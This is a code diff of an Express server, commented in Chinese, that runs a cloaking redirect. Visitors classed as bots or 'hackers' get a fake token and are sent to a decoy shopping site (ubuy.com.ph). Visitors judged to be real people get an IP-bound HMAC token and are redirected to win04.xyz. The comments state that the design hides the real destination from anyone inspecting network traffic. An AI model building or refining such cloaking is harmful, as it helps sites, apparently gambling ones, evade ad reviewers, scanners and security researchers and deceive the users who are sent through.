@@ -154,47 +154,60 @@ async function runChecks(req) {
 
 // ============================================
 // POST /api/verify
-// 返回 JSON { redirectUrl } — 前端直接 window.location.href 跳转
+// 返回 JSON { token } — 前端只知道 /r?token=xxx，不知道真实 URL
+// token = HMAC token (真人) 或 fake_xxx (机器人)
 // ============================================
 app.post('/api/verify', async (req, res) => {
   const result = await runChecks(req);
 
   if (!result.pass) {
-    // 骇客/机器人 → 直接跳转假站
-    console.log(`[verify] FAIL (${result.reason}) → ubuy.com.ph`);
-    return res.json({ redirectUrl: FAKE_REDIRECT, pass: false, reason: result.reason });
+    // 骇客/机器人 → fake token (/r 会重定向到 ubuy.com.ph)
+    console.log(`[verify] FAIL (${result.reason}) → fake token`);
+    return res.json({ token: result.token });
   }
 
-  // 真人 → HMAC token + flash-sale 验证 → 真站
+  // 真人 → HMAC token (/r 会验证并重定向到 win04.xyz)
+  console.log(`[verify] PASS → HMAC token`);
+  return res.json({ token: result.token });
+});
+
+// ============================================
+// GET /r?token=xxx
+// 验证 token 并 302 跳转：真 token → win04.xyz，fake token → ubuy.com.ph
+// 骇客/爬虫在 Network 面板只能看到 /r?token=xxx，看不到 win04.xyz
+// ============================================
+app.get('/r', (req, res) => {
+  const { token } = req.query;
+  if (!token) {
+    return res.status(400).send('Missing token');
+  }
+
+  if (token.startsWith('fake_')) {
+    // 机器人 → 跳转假站
+    console.log(`[redirect] fake token → ubuy.com.ph`);
+    return res.redirect(302, FAKE_REDIRECT);
+  }
+
+  // 解析 HMAC token: ts.ipSig.hexSig
+  const parts = token.split('.');
+  if (parts.length !== 3) {
+    console.log(`[redirect] invalid token format → ubuy.com.ph`);
+    return res.redirect(302, FAKE_REDIRECT);
+  }
+
+  const [ts, ipSig, hexSig] = parts;
   const clientIP = getClientIP(req);
-  const flashSaleUrl = `${FLASH_SALE_URL}?token=${encodeURIComponent(result.token)}`;
+  const expectedIpSig = crypto.createHmac('sha256', HMAC_SECRET).update(clientIP).digest('hex').substring(0, 32);
+  const expectedHexSig = crypto.createHmac('sha256', HMAC_SECRET).update(`${ts}.${clientIP}`).digest('hex');
 
-  try {
-    // 静默调用 flash-sale 服务端点，让它验证 HMAC 并返回最终 redirect
-    // 注意：flash-sale 从 x-forwarded-for 取 IP，这里透传原始 IP
-    const resp = await fetch(flashSaleUrl, {
-      method: 'GET',
-      headers: {
-        'X-Forwarded-For': clientIP,
-        'Accept': 'text/html'
-      },
-      redirect: 'manual' // 不自动跟随 302，由我们读取 Location header
-    });
-
-    if (resp.status === 302 || resp.status === 301) {
-      const location = resp.headers.get('location');
-      console.log(`[verify] PASS → real redirect: ${location}`);
-      return res.json({ redirectUrl: location, pass: true, reason: 'verified' });
-    }
-
-    // 非重定向响应（异常情况），默认走真站
-    console.log(`[verify] PASS but flash-sale returned status ${resp.status}`);
-    return res.json({ redirectUrl: REAL_REDIRECT, pass: true, reason: 'verified' });
-
-  } catch (e) {
-    console.log(`[verify] flash-sale call failed: ${e.message} → fallback real redirect`);
-    return res.json({ redirectUrl: REAL_REDIRECT, pass: true, reason: 'verified' });
+  if (ipSig !== expectedIpSig || hexSig !== expectedHexSig) {
+    console.log(`[redirect] token signature mismatch → ubuy.com.ph`);
+    return res.redirect(302, FAKE_REDIRECT);
   }
+
+  // token 有效 → 跳转真站 (win04.xyz)
+  console.log(`[redirect] valid token → win04.xyz`);
+  return res.redirect(302, REAL_REDIRECT);
 });
 
 // ============================================
